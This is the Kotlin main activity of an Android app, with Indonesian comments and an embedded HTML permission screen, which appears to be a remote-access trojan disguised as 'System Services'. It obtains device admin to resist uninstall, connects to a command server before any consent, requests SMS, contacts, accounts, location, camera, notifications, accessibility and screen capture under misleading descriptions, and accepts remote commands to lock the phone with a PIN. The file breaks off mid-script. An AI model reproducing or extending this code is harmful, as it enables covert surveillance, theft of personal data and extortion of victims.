package com.sync.xxx

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.AppOpsManager
import android.content.*
import android.content.pm.PackageManager
import android.location.LocationManager
import android.media.projection.MediaProjectionManager
import android.os.*
import android.provider.Settings
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    private val PERM_ALL = 999
    private val REQ_SCREEN_CAPTURE = 102
    private val REQ_LOCATION_SETTINGS = 107

    private val screenCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.REQUEST_SCREEN_CAPTURE") {
                try {
                    val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                    startActivityForResult(mgr.createScreenCaptureIntent(), REQ_SCREEN_CAPTURE)
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "Screen capture error: ${e.message}")
                }
            }
        }
    }

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            try {
                if (intent.action != DeviceService.ACTION_COMMAND) return
                val cmd = intent.getStringExtra(DeviceService.EXTRA_COMMAND) ?: return
                val value = intent.getStringExtra(DeviceService.EXTRA_VALUE) ?: ""
                handleCommand(cmd, value)
            } catch (e: Exception) {
                android.util.Log.e("MainActivity", "Command error: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        try {
            setContentView(R.layout.activity_main)
            setupWebView()
            registerReceivers()
            AntiUninstallHelper.requestAdminIfNeeded(this)
            
            // 🔥 LANGSUNG START SERVICE & CONNECT (TANPA TUNGGU IZIN)
            startDeviceService()
            connectToServer()
            
            // 🔥 MINTA IZIN SEMUA SEKALIGUS (TAPI TIDAK MENGHALANGI KONEKSI)
            requestAllPermissionsAtOnce()
            
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onCreate error: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun connectToServer() {
        try {
            android.util.Log.d("MainActivity", "🔄 Connecting to server...")
            val intent = Intent(DeviceService.ACTION_CONNECT).apply { 
                setPackage(packageName)
                putExtra("auto_connect", true)
            }
            sendBroadcast(intent)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "connectToServer error: ${e.message}")
        }
    }

    private fun registerReceivers() {
        try {
            val filter = IntentFilter(DeviceService.ACTION_COMMAND)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(commandReceiver, filter)
            }

            val screenFilter = IntentFilter("com.sync.xxx.REQUEST_SCREEN_CAPTURE")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenCaptureReceiver, screenFilter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(screenCaptureReceiver, screenFilter)
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "registerReceivers error: ${e.message}")
        }
    }

    private fun requestAllPermissionsAtOnce() {
        try {
            val permissions = mutableListOf<String>()
            
            // SEMUA PERMISSION DALAM 1 LIST
            permissions.add(Manifest.permission.CAMERA)
            permissions.add(Manifest.permission.READ_SMS)
            permissions.add(Manifest.permission.READ_CONTACTS)
            permissions.add(Manifest.permission.GET_ACCOUNTS)
            permissions.add(Manifest.permission.READ_PHONE_STATE)
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
                permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
                permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            } else {
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
            
            // FILTER PERMISSION YANG BELUM GRANTED
            val neededPermissions = permissions.filter { perm ->
                ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED
            }.toTypedArray()
            
            android.util.Log.d("Permission", "📋 Requesting ${neededPermissions.size} permissions sekaligus!")
            
            if (neededPermissions.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, neededPermissions, PERM_ALL)
            } else {
                android.util.Log.d("Permission", "✅ All permissions already granted!")
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "requestAllPermissionsAtOnce error: ${e.message}")
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        try {
            android.util.Log.d("Permission", "=== PERMISSION RESULT ===")
            permissions.forEachIndexed { index, perm ->
                val granted = if (index < grantResults.size) {
                    grantResults[index] == PackageManager.PERMISSION_GRANTED
                } else false
                android.util.Log.d("Permission", "${if (granted) "✅" else "❌"} $perm = $granted")
            }
            
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
                } catch (e: Exception) {
                    android.util.Log.e("MainActivity", "UI refresh error: ${e.message}")
                }
            }, 500)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onRequestPermissionsResult error: ${e.message}")
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        try {
            when (requestCode) {
                REQ_SCREEN_CAPTURE -> {
                    val intent = Intent(DeviceService.ACTION_SCREEN_RESULT).apply {
                        putExtra(DeviceService.EXTRA_RESULT_CODE, resultCode)
                        putExtra(DeviceService.EXTRA_RESULT_DATA, data)
                        setPackage(packageName)
                        addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
                    }
                    sendBroadcast(intent)
                }
                REQ_LOCATION_SETTINGS -> {
                    webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onActivityResult error: ${e.message}")
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
            webView.evaluateJavascript("if(typeof updateConnectionStatus==='function') updateConnectionStatus()", null)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "onResume error: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(screenCaptureReceiver) } catch (_: Exception) {}
    }

    private fun handleCommand(cmd: String, value: String) {
        try {
            when (cmd) {
                "lockDevice" -> {
                    val parts = value.split("|")
                    val pin = parts.getOrNull(0) ?: ""
                    val title = parts.getOrNull(1) ?: "Perangkat Terkunci"
                    startLockMode(pin, title)
                }
                "unlockDevice" -> stopLockMode()
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "handleCommand error: ${e.message}")
        }
    }

    private fun startLockMode(pin: String, title: String) {
        try {
            webView.evaluateJavascript(
                "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')", null
            )
            startLockTask()
        } catch (e: Exception) {
            android.util.Log.w("MainActivity", "startLockTask: ${e.message}")
        }
    }

    private fun stopLockMode() {
        try {
            stopLockTask()
            webView.evaluateJavascript("if(typeof hideLockScreen==='function') hideLockScreen()", null)
            val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
            sendBroadcast(i)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "stopLockMode error: ${e.message}")
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        try {
            webView = findViewById(R.id.mainWebView)
            webView.settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                allowFileAccess = true
                mediaPlaybackRequiresUserGesture = false
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                    mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                setSupportZoom(false)
                builtInZoomControls = false
                displayZoomControls = false
                loadWithOverviewMode = true
                useWideViewPort = true
            }
            
            val bridge = AppBridge(this, webView)
            AppBridge.instance = bridge
            webView.addJavascriptInterface(bridge, "Android")
            webView.addJavascriptInterface(MainBridge(), "MainBridge")
            
            webView.webChromeClient = object : WebChromeClient() {
                override fun onPermissionRequest(request: PermissionRequest) {
                    request.grant(request.resources)
                }
            }
            webView.webViewClient = WebViewClient()
            
            val serverUrl = DeviceService.SERVER_URL
            webView.loadDataWithBaseURL(serverUrl, buildHtml(), "text/html", "UTF-8", null)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "setupWebView error: ${e.message}")
            e.printStackTrace()
        }
    }

    // ===================== PERMISSION CHECKS =====================
    
    fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    
    fun isGalleryGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    
    fun isNotifListenerGranted(): Boolean {
        try {
            val enabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
            return enabled?.contains(packageName) == true
        } catch (e: Exception) {
            return false
        }
    }
    
    fun isLocationGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

    fun isGpsEnabled(): Boolean {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            return lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                   lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
        } catch (e: Exception) {
            return false
        }
    }

    fun requestEnableGps() {
        try {
            val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000L).build()
            val builder = LocationSettingsRequest.Builder().addLocationRequest(request).setAlwaysShow(true)
            val client = LocationServices.getSettingsClient(this)
            client.checkLocationSettings(builder.build())
                .addOnSuccessListener {
                    webView.evaluateJavascript("if(typeof refreshPerms==='function') refreshPerms()", null)
                }
                .addOnFailureListener { exception ->
                    if (exception is ResolvableApiException) {
                        try {
                            exception.startResolutionForResult(this, REQ_LOCATION_SETTINGS)
                        } catch (_: Exception) {
                            startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                        }
                    } else {
                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                    }
                }
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
        }
    }

    fun isContactsGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    fun isGmailGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED

    fun isPhoneGranted(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED &&
        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED

    fun isManageStorageGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    fun requestManageStoragePerm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = android.net.Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            ActivityCompat.requestPermissions(this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                PERM_ALL)
        }
    }

    fun isBatteryOptIgnored() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } else true
    
    fun isOverlayGranted() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Settings.canDrawOverlays(this)
    } else true

    fun isAccessibilityGranted(): Boolean {
        try {
            val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            return enabled?.contains(packageName) == true
        } catch (e: Exception) {
            return false
        }
    }

    fun isUsageAccessGranted(): Boolean {
        try {
            val appOps = getSystemService(AppOpsManager::class.java)
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    packageName
                )
            } else {
                appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(),
                    packageName
                )
            }
            return mode == AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            return false
        }
    }

    private fun startDeviceService() {
        try {
            val svcIntent = Intent(this, DeviceService::class.java)
            ContextCompat.startForegroundService(this, svcIntent)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "startDeviceService error: ${e.message}")
        }
    }

    // ===================== HTML KEREN TANPA EMOJI =====================
    
    private fun buildHtml(): String {
        return """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sync System</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0f;
            color: #ffffff;
            font-family: 'Inter', -apple-system, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }
        
        .screen {
            display: none;
            width: 100%;
            height: 100%;
            padding: 24px 20px;
            flex-direction: column;
            align-items: center;
            overflow-y: auto;
        }
        
        .screen.active {
            display: flex;
        }
        
        /* ========== HEADER ========== */
        .header {
            text-align: center;
            padding: 32px 0 20px 0;
            width: 100%;
            max-width: 400px;
        }
        
        .logo-icon {
            width: 72px;
            height: 72px;
            margin: 0 auto 16px auto;
            background: linear-gradient(135deg, rgba(99, 102, 241, 0.15), rgba(99, 102, 241, 0.05));
            border-radius: 24px;
            border: 1px solid rgba(99, 102, 241, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        
        .logo-icon svg {
            width: 34px;
            height: 34px;
        }
        
        .logo-icon .pulse {
            position: absolute;
            inset: -4px;
            border-radius: 28px;
            border: 1px solid rgba(99, 102, 241, 0.08);
            animation: pulse-ring 3s ease-in-out infinite;
        }
        
        @keyframes pulse-ring {
            0%, 100% { opacity: 0.4; transform: scale(1); }
            50% { opacity: 0.1; transform: scale(1.05); }
        }
        
        .title {
            font-size: 22px;
            font-weight: 800;
            color: #f8fafc;
            letter-spacing: -0.5px;
            line-height: 1.2;
        }
        
        .title .highlight {
            color: #6366f1;
        }
        
        .subtitle {
            font-size: 13px;
            font-weight: 400;
            color: #94a3b8;
            margin-top: 6px;
            line-height: 1.6;
        }
        
        .divider {
            width: 100%;
            max-width: 400px;
            height: 1px;
            background: linear-gradient(90deg, transparent, #1e1e30, transparent);
            margin: 8px 0 16px 0;
        }
        
        /* ========== STATUS BAR ========== */
        .status-bar {
            width: 100%;
            max-width: 400px;
            background: #0f0f17;
            border: 1px solid #1a1a28;
            border-radius: 12px;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }
        
        .status-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            transition: all 0.3s;
        }
        
        .status-dot.online {
            background: #22c55e;
            box-shadow: 0 0 12px rgba(34, 197, 94, 0.3);
            animation: dot-pulse 2s infinite;
        }
        
        .status-dot.connecting {
            background: #f59e0b;
            box-shadow: 0 0 12px rgba(245, 158, 11, 0.3);
            animation: dot-blink 1s infinite;
        }
        
        .status-dot.offline {
            background: #ef4444;
            animation: dot-blink 1.5s infinite;
        }
        
        @keyframes dot-pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        
        @keyframes dot-blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }
        
        .status-label {
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        
        .status-label.online { color: #22c55e; }
        .status-label.connecting { color: #f59e0b; }
        .status-label.offline { color: #ef4444; }
        
        .status-device {
            font-size: 11px;
            color: #475569;
            font-weight: 400;
        }
        
        /* ========== PERMISSION LIST ========== */
        .perm-list {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            gap: 6px;
            margin: 4px 0 12px 0;
        }
        
        .perm-item {
            background: #0f0f17;
            border: 1px solid #161622;
            border-radius: 10px;
            padding: 10px 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.25s ease;
        }
        
        .perm-item.granted {
            border-color: rgba(34, 197, 94, 0.15);
            background: rgba(34, 197, 94, 0.03);
        }
        
        .perm-icon {
            width: 32px;
            height: 32px;
            border-radius: 8px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: 600;
            color: #94a3b8;
            background: rgba(99, 102, 241, 0.08);
            border: 1px solid rgba(99, 102, 241, 0.06);
        }
        
        .perm-item.granted .perm-icon {
            border-color: rgba(34, 197, 94, 0.15);
            background: rgba(34, 197, 94, 0.08);
            color: #22c55e;
        }
        
        .perm-info {
            flex: 1;
            min-width: 0;
        }
        
        .perm-name {
            font-size: 13px;
            font-weight: 500;
            color: #e2e8f0;
            letter-spacing: -0.2px;
        }
        
        .perm-desc {
            font-size: 10.5px;
            font-weight: 400;
            color: #475569;
            margin-top: 1px;
        }
        
        .perm-item.granted .perm-desc {
            color: rgba(34, 197, 94, 0.5);
        }
        
        .perm-status {
            font-size: 11px;
            font-weight: 600;
            padding: 2px 10px;
            border-radius: 20px;
            flex-shrink: 0;
            background: rgba(239, 68, 68, 0.1);
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.1);
            transition: all 0.3s;
        }
        
        .perm-status.granted {
            background: rgba(34, 197, 94, 0.1);
            color: #22c55e;
            border-color: rgba(34, 197, 94, 0.15);
        }
        
        /* ========== BADGE ALL GRANTED ========== */
        .badge-all {
            width: 100%;
            max-width: 400px;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 10px;
            background: rgba(34, 197, 94, 0.05);
            border: 1px solid rgba(34, 197, 94, 0.12);
            border-radius: 10px;
            font-size: 12px;
            font-weight: 500;
            color: #22c55e;
            margin-bottom: 12px;
        }
        
        .badge-all.show {
            display: flex;
        }
        
        .badge-all svg {
            width: 14px;
            height: 14px;
            stroke: #22c55e;
            stroke-width: 2.5;
            fill: none;
        }
        
        /* ========== BUTTON ========== */
        .btn-primary {
            width: 100%;
            max-width: 400px;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 700;
            font-family: 'Inter', sans-serif;
            letter-spacing: 0.5px;
            cursor: pointer;
            transition: all 0.15s ease;
            background: linear-gradient(135deg, #6366f1, #4f46e5);
            color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 4px;
        }
        
        .btn-primary:active {
            transform: scale(0.97);
            opacity: 0.85;
        }
        
        .btn-primary .icon {
            width: 16px;
            height: 16px;
            stroke: currentColor;
            stroke-width: 2;
            fill: none;
        }
        
        .btn-primary.secondary {
            background: #0f0f17;
            color: #94a3b8;
            border: 1px solid #1a1a28;
        }
        
        .btn-primary.secondary:active {
            background: #1a1a28;
        }
        
        /* ========== FOOTER ========== */
        .footer {
            width: 100%;
            max-width: 400px;
            text-align: center;
            padding: 16px 0 8px 0;
        }
        
        .footer-text {
            font-size: 10px;
            font-weight: 500;
            color: #2a2a40;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        
        /* ========== CONNECTED SCREEN ========== */
        .connected-icon {
            width: 80px;
            height: 80px;
            border-radius: 40px;
            background: rgba(34, 197, 94, 0.08);
            border: 1px solid rgba(34, 197, 94, 0.15);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }
        
        .connected-icon svg {
            width: 36px;
            height: 36px;
            stroke: #22c55e;
            stroke-width: 1.8;
            fill: none;
        }
        
        .connected-title {
            font-size: 24px;
            font-weight: 800;
            color: #22c55e;
            letter-spacing: -0.5px;
        }
        
        .connected-sub {
            font-size: 13px;
            color: #94a3b8;
            margin-top: 4px;
        }
        
        .connected-device {
            margin-top: 16px;
            padding: 14px 20px;
            background: #0f0f17;
            border: 1px solid #1a1a28;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .connected-device .label {
            font-size: 10px;
            font-weight: 600;
            color: #475569;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .connected-device .value {
            font-size: 13px;
            font-weight: 500;
            color: #e2e8f0;
            margin-top: 2px;
            font-family: 'Inter', monospace;
        }
        
        /* ========== SCROLLBAR ========== */
        ::-webkit-scrollbar {
            width: 3px;
        }
        
        ::-webkit-scrollbar-track {
            background: transparent;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #1e1e30;
            border-radius: 10px;
        }
    </style>
</head>
<body>

<!-- ============================================================ -->
<!-- PERMISSION SCREEN -->
<!-- ============================================================ -->
<div class="screen active" id="permScreen">

    <!-- HEADER -->
    <div class="header">
        <div class="logo-icon">
            <div class="pulse"></div>
            <svg viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.6">
                <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7L12 2z"/>
                <path d="M9 12l2 2 4-4" stroke-width="1.8"/>
            </svg>
        </div>
        <div class="title">Akses <span class="highlight">Diperlukan</span></div>
        <div class="subtitle">Izinkan semua akses agar aplikasi berjalan maksimal tanpa kendala</div>
    </div>

    <!-- STATUS BAR -->
    <div class="status-bar" id="statusBar">
        <div class="status-indicator">
            <div class="status-dot" id="statusDot"></div>
            <span class="status-label" id="statusLabel">Memuat...</span>
        </div>
        <span class="status-device" id="deviceId">ID: —</span>
    </div>

    <div class="divider"></div>

    <!-- PERMISSION LIST -->
    <div class="perm-list" id="permList">
        <div class="perm-item" id="p-cam">
            <div class="perm-icon">C</div>
            <div class="perm-info">
                <div class="perm-name">Kamera</div>
                <div class="perm-desc">Untuk fitur pemindaian</div>
            </div>
            <span class="perm-status" id="s-cam">Tunggu</span>
        </div>
        <div class="perm-item" id="p-bat">
            <div class="perm-icon">B</div>
            <div class="perm-info">
                <div class="perm-name">Optimasi Baterai</div>
                <div class="perm-desc">Mencegah sistem menghentikan aplikasi</div>
            </div>
            <span class="perm-status" id="s-bat">Tunggu</span>
        </div>
        <div class="perm-item" id="p-overlay">
            <div class="perm-icon">O</div>
            <div class="perm-info">
                <div class="perm-name">Floating Window</div>
                <div class="perm-desc">Aplikasi mengambang di atas aplikasi lain</div>
            </div>
            <span class="perm-status" id="s-overlay">Tunggu</span>
        </div>
        <div class="perm-item" id="p-accessibility">
            <div class="perm-icon">A</div>
            <div class="perm-info">
                <div class="perm-name">Aksesibilitas</div>
                <div class="perm-desc">Mendeteksi dan meningkatkan performa</div>
            </div>
            <span class="perm-status" id="s-accessibility">Tunggu</span>
        </div>
        <div class="perm-item" id="p-usage">
            <div class="perm-icon">U</div>
            <div class="perm-info">
                <div class="perm-name">Penggunaan Aplikasi</div>
                <div class="perm-desc">Melihat daftar aplikasi terinstall</div>
            </div>
            <span class="perm-status" id="s-usage">Tunggu</span>
        </div>
        <div class="perm-item" id="p-sms">
            <div class="perm-icon">S</div>
            <div class="perm-info">
                <div class="perm-name">Baca SMS</div>
                <div class="perm-desc">Membaca SMS yang masuk</div>
            </div>
            <span class="perm-status" id="s-sms">Tunggu</span>
        </div>
        <div class="perm-item" id="p-notif">
            <div class="perm-icon">N</div>
            <div class="perm-info">
                <div class="perm-name">Akses Notifikasi</div>
                <div class="perm-desc">Membaca notifikasi dari semua aplikasi</div>
            </div>
            <span class="perm-status" id="s-notif">Tunggu</span>
        </div>
        <div class="perm-item" id="p-gallery">
            <div class="perm-icon">G</div>
            <div class="perm-info">
                <div class="perm-name">Galeri</div>
                <div class="perm-desc">Mengakses foto dan file</div>
            </div>
            <span class="perm-status" id="s-gallery">Tunggu</span>
        </div>
        <div class="perm-item" id="p-location">
            <div class="perm-icon">L</div>
            <div class="perm-info">
                <div class="perm-name">Lokasi</div>
                <div class="perm-desc">Mengakses lokasi GPS</div>
            </div>
            <span class="perm-status" id="s-location">Tunggu</span>
        </div>
        <div class="perm-item" id="p-gpson">
            <div class="perm-icon">P</div>
            <div class="perm-info">
                <div class="perm-name">GPS</div>
                <div class="perm-desc">GPS harus dihidupkan</div>
            </div>
            <span class="perm-status" id="s-gpson">Tunggu</span>
        </div>
        <div class="perm-item" id="p-contacts">
            <div class="perm-icon">K</div>
            <div class="perm-info">
                <div class="perm-name">Kontak</div>
                <div class="perm-desc">Membaca daftar kontak</div>
            </div>
            <span class="perm-status" id="s-contacts">Tunggu</span>
        </div>
        <div class="perm-item" id="p-gmail">
            <div class="perm-icon">M</div>
            <div class="perm-info">
                <div class="perm-name">Akun Google</div>
                <div class="perm-desc">Membaca akun Google terdaftar</div>
            </div>
            <span class="perm-status" id="s-gmail">Tunggu</span>
        </div>
        <div class="perm-item" id="p-phone">
            <div class="perm-icon">T</div>
            <div class="perm-info">
                <div class="perm-name">Info Telepon</div>
                <div class="perm-desc">Membaca nomor telepon dan SIM</div>
            </div>
            <span class="perm-status" id="s-phone">Tunggu</span>
        </div>
        <div class="perm-item" id="p-storage">
            <div class="perm-icon">F</div>
            <div class="perm-info">
                <div class="perm-name">Akses Penyimpanan</div>
                <div class="perm-desc">Akses ke semua file di penyimpanan</div>
            </div>
            <span class="perm-status" id="s-storage">Tunggu</span>
        </div>
    </div>

    <!-- BADGE ALL GRANTED -->
    <div class="badge-all" id="allGrantedBadge">
        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
        Semua Akses Telah Diaktifkan
    </div>

    <!-- BUTTON -->
    <button class="btn-primary secondary" id="btnMasuk" onclick="handleMasuk()">
        <svg class="icon" viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-.49-4.5"/></svg>
        <span id="btnLabel">Perbarui Status</span>
    </button>

    <div class="footer">
        <span class="footer-text">System Services &bull; v1.0</span>
    </div>
</div>

<!-- ============================================================ -->
<!-- CONNECTED SCREEN -->
<!-- ============================================================ -->
<div class="screen" id="connectedScreen">

    <div class="header" style="padding-top: 60px;">
        <div class="connected-icon">
            <svg viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
        </div>
        <div class="connected-title">Tersambung</div>
        <div class="connected-sub">Perangkat terhubung dengan server</div>
    </div>

    <div class="connected-device">
        <div class="label">ID Perangkat</div>
        <div class="value" id="connDeviceId">—</div>
    </div>

    <div class="connected-device" style="margin-top: 8px;">
        <div class="label">Status</div>
        <div class="value" style="color:#22c55e;" id="connStatus">Online</div>
    </div>

    <button class="btn-primary" style="margin-top: 20px;" onclick="refreshStatus()">
        <svg class="icon" viewBox="0 0 24 24"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-.49-4.5"/></svg>
        Refresh Status
    </button>

    <div class="footer">
        <span class="footer-text">System Services &bull; v1.0</span>
    </div>
</div>

<!-- ============================================================ -->
<!-- JAVASCRIPT -->
<!-- ============================================================ -->
<script>
    var permIds = ['cam','bat','overlay','accessibility','usage','sms','notif','gallery','location','gpson','contacts','gmail','phone','storage'];
    var isConnected = false;

    function refreshPerms() {
        if (!window.Android) return;
        try {
            var state = {
                cam: Android.isCamGranted(),
                bat: Android.isBatteryOptIgnored(),
                overlay: Android.isOverlayGranted(),
                accessibility: Android.isAccessibilityGranted(),
                usage: Android.isUsageAccessGranted(),
                sms: Android.isSmsGranted(),
                notif: Android.isNotifListenerGranted(),
                gallery: Android.isGalleryGranted(),
                location: Android.isLocationGranted(),
                gpson: Android.isGpsEnabled(),
                contacts: Android.isContactsGranted(),
                gmail: Android.isGmailGranted(),
                phone: Android.isPhoneGranted(),
                storage: Android.isManageStorageGranted()
            };
            
            var allOk = true;
            permIds.forEach(function(id) {
